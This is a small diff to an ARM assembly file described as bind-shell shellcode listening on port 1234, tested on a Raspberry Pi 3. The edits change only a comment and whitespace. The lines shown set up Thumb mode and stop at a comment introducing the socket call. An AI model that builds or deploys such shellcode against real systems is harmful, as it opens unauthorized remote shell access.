@@ -1,6 +1,6 @@
 /**
   bind shell to port 1234
-  tested on raspberry pi 3
+  tested with linux running on raspberry pi 3  
 */
 
     .global _start
@@ -8,9 +8,9 @@
 
 _start:
     // switch to thumb mode
-	  .code 32
+    .code 32
     add    r3, pc, #1
-    bx     r3	
+    bx     r3 
   
     .code 16
     // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
